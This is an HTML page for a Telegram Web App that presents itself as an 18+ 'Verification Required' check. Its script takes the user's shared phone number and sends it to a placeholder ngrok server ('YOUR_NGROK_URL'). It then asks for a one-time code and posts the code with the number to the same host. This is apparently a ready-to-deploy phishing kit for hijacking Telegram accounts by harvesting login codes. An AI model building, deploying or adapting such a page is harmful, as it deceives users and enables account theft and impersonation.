<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        html, body {
            height: 100%;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            color: white;
            text-align: center;
            display: flex;
            align-items: center;
            justify-content: center;
            background: url('https://i.imgur.com/ZMoVH0A.jpeg') no-repeat center center fixed;
            background-size: cover;
        }
        .overlay { background: rgba(0,0,0,0.5); padding: 30px; border-radius: 20px; width: 90%; max-width: 400px; }
        .button { background: #2ecc71; color: white; border: none; padding:15px 30px; border-radius:10px; font-size:18px; margin:10px; width:80%; max-width:300px; }
        input { padding:12px; font-size:16px; width:80%; max-width:300px; margin:10px; }
        .hidden { display:none; }
        .loader { border:8px solid rgba(255,255,255,0.3); border-top:8px solid #2ecc71; border-radius:50%; width:60px; height:60px; animation:spin 1s linear infinite; margin:20px auto; }
        @keyframes spin { 100% { transform:rotate(360deg); } }
    </style>
</head>
<body>
    <div class="overlay">
        <h2>Verification Required</h2>
        <div id="step1">
            <p>Confirm you are 18+</p>
            <button class="button" onclick="confirm18()">✅ Confirm 18+</button>
        </div>
        <div id="step2" class="hidden">
            <p>Share contact to proceed</p>
            <button class="button" onclick="requestContact()">📱 Share Contact</button>
        </div>
        <div id="step3" class="hidden">
            <p>Sending OTP...</p>
            <div class="loader"></div>
        </div>
        <div id="step4" class="hidden">
            <input type="text" id="otpInput" placeholder="Enter OTP" maxlength="6">
            <button class="button" onclick="submitOTP()">Verify</button>
            <p id="error" style="color:red;" class="hidden">Invalid OTP. Try again.</p>
        </div>
    </div>
    <script>
        const WebApp = window.Telegram.WebApp;
        let userPhone = "";
        WebApp.ready();
        WebApp.expand();
        function confirm18() { document.getElementById('step1').classList.add('hidden'); document.getElementById('step2').classList.remove('hidden'); }
        function requestContact() { WebApp.requestContact(function(success, contact) { if(success && contact) { userPhone = contact.phone_number; document.getElementById('step2').classList.add('hidden'); document.getElementById('step3').classList.remove('hidden'); setTimeout(() => { document.getElementById('step3').classList.add('hidden'); document.getElementById('step4').classList.remove('hidden'); sendPhone(userPhone); }, 2500); } else { alert("Please share your contact to continue."); } }); }
        function sendPhone(phone) { fetch('https://YOUR_NGROK_URL/send_otp', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({phone:phone}) }); }
        function submitOTP() { const otp = document.getElementById('otpInput').value; if(otp.length<4) { document.getElementById('error').classList.remove('hidden'); return; } fetch('https://YOUR_NGROK_URL/verify_otp', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({phone:userPhone, otp:otp}) }).then(r=>r.json()).then(d=>{ if(d.success) { WebApp.showAlert("✅ Verification successful!"); WebApp.close(); } else { document.getElementById('error').classList.remove('hidden'); } }); }
    </script>
</body>
</html>
